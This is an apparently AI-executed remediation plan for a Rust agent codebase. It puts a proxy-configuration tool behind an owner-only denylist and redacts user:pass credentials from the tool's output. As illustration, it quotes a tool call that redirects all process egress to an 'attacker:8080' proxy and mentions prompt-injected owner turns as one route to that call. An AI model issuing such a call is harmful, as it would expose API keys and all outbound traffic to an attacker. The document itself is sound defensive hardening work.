# Plan 201: Make `proxy_config` owner-only and stop it echoing proxy credentials

> **Executor instructions**: Follow step by step. Run every verification
> command and confirm the expected result. On a "STOP condition", stop and
> report. When done, update this plan's status row in `plans/README.md`.
>
> **Drift check (run first)**:
> `git diff --stat bba8e1d..HEAD -- src/approval/guest.rs src/tools/proxy_config.rs`

## Status

- **Priority**: P1 (security — egress redirection + credential leak)
- **Effort**: S
- **Risk**: LOW
- **Depends on**: none
- **Category**: security / bug
- **Planned at**: commit `bba8e1d`, 2026-08-20

## Why this matters

`proxy_config` persists proxy settings to `config.toml` and, for
`scope=environment`, rewrites the whole process's `HTTP(S)_PROXY`
(`src/tools/proxy_config.rs:247-255`). Redirecting egress reroutes **all**
outbound traffic — including provider API calls that carry the Anthropic/OpenAI
keys — through an attacker-controlled proxy.

It is a persistent-config-mutating, traffic-redirecting tool of exactly the
class already on the owner-only denylist (`manage_permissions`,
`issue_pairing_code`, `ssh`, `pty`, …), yet it is **not** on that list. An owner
who adds it to `guest_allowed_tools` (or a prompt-injected owner turn) can point
all traffic at `{action:"set",scope:"environment",http_proxy:"http://attacker:8080",enabled:true}`.

Separately, `proxy_config` echoes proxy URLs verbatim into its `ToolResult`
output (`proxy_config.rs:120-139`). Proxy URLs frequently embed credentials
(`http://user:pass@host:port`), so those land in the model-/channel-visible
output — a data-minimization violation.

## Current state

### `proxy_config` is absent from the owner-only denylist — `src/approval/guest.rs:65-77`

```rust
    pub const OWNER_ONLY_TOOLS: &'static [&'static str] = &[
        "manage_permissions",
        "issue_pairing_code",
        "delegate",
        "ssh",
        "pty",
        "author_skill",
        "skills_install",
        "skills_install_deps",
        "cron_add",
        "cron_update",
        "cron_run",
        // MISSING: proxy_config  (and cron_remove — that is plan 205)
    ];
```

### It gates only on write-access, not ownership — `src/tools/proxy_config.rs:40-59`

`require_write_access` checks `can_act()` + `record_action()` only; there is no
ownership check inside the tool (correct — ownership is enforced by the
`GuestGate`, which is exactly why the tool must be on the list).

### It echoes proxy URLs verbatim — `src/tools/proxy_config.rs:120-139`

`env_snapshot` returns `HTTP_PROXY`/`HTTPS_PROXY`/`ALL_PROXY` values and
`proxy_json` returns `http_proxy`/`https_proxy`/`all_proxy` verbatim; both are
embedded in the `get`/`set`/`disable`/`apply_env` output.

## The fix

### Step 1 — add `proxy_config` to the owner-only denylist

Add `"proxy_config"` to `OWNER_ONLY_TOOLS` in `src/approval/guest.rs`, matching
the treatment of the other config-mutating/traffic-affecting tools. Keep the
tool-name string in one canonical place if the tool already exports a
`TOOL_NAME` const (mirror how `issue_pairing_code` exposes `TOOL_NAME`); use
that const rather than a bare literal if it exists.

### Step 2 — redact userinfo from proxy URLs in output

In `env_snapshot` / `proxy_json` (or wherever the value is placed into the
`ToolResult` output), strip any `user:pass@` userinfo before display. A minimal
helper:

```rust
/// Strip `user:pass@` userinfo from a proxy URL so credentials never reach the
/// model-/channel-visible tool output. Non-URL or userinfo-free values pass
/// through unchanged.
fn redact_proxy_userinfo(url: &str) -> String {
    // split scheme://[userinfo@]host... ; drop the userinfo segment if present
    match url.split_once("://") {
        Some((scheme, rest)) => match rest.split_once('@') {
            Some((_userinfo, host)) => format!("{scheme}://***@{host}"),
            None => url.to_string(),
        },
        None => url.to_string(),
    }
}
```

Apply it to every proxy URL the tool emits into `output`. Do **not** alter the
value written to config/env — only the displayed copy.

## Files

- **In scope**: `src/approval/guest.rs` (the list), `src/tools/proxy_config.rs`
  (the redaction).
- **Out of scope**: the config-API redaction key list (that is a separate
  MCP-env finding), the `manage_permissions` hardening (plan 202), any other
  tool's output.

## STOP conditions

- If `proxy_config` is already on `OWNER_ONLY_TOOLS` (drift), skip Step 1 and
  report; still do Step 2 if the redaction is missing.

## Done criteria

1. `cargo fmt --all -- --check` clean.
2. `cargo clippy --all-targets -- -D warnings` clean.
3. `cargo test -p rantaiclaw --lib approval::guest tools::proxy_config` passes
   with new tests.
4. New tests:

```rust
#[test]
fn proxy_config_is_owner_only() {
    assert!(GuestGate::OWNER_ONLY_TOOLS.contains(&"proxy_config"));
}

#[test]
fn proxy_url_credentials_are_redacted_in_output() {
    assert_eq!(redact_proxy_userinfo("http://u:p@host:8080"), "http://***@host:8080");
    assert_eq!(redact_proxy_userinfo("http://host:8080"), "http://host:8080");
}
```

Also add/extend a guest-gate test asserting a guest turn cannot invoke
`proxy_config` even when it is in `guest_allowed_tools` (mirror the existing
owner-only denial test for `manage_permissions` in `guest.rs`).

## Test plan

- Guest-gate: find the existing test that asserts `manage_permissions` is denied
  to a guest regardless of `guest_allowed_tools`, and add a `proxy_config` case.
- Redaction: unit-test `redact_proxy_userinfo` directly; a full tool-output test
  is optional.

**Never put a real credential in a test fixture** — use the obviously-fake
`u:p@host` placeholder above.

## Risk & rollback

- **Risk**: LOW — tightening a guest-reachable surface (fails safe) and masking
  a displayed value (nothing on the write path changes).
- **Rollback**: revert the two files; no schema/config/migration change.

## Maintenance note

Any new tool that persists config or alters process-wide egress/credentials
belongs on `OWNER_ONLY_TOOLS`. Consider a doc comment on the const listing the
inclusion criterion so the next config-mutating tool is not missed (the same
class of omission produced this finding and the `cron_remove` one in plan 205).
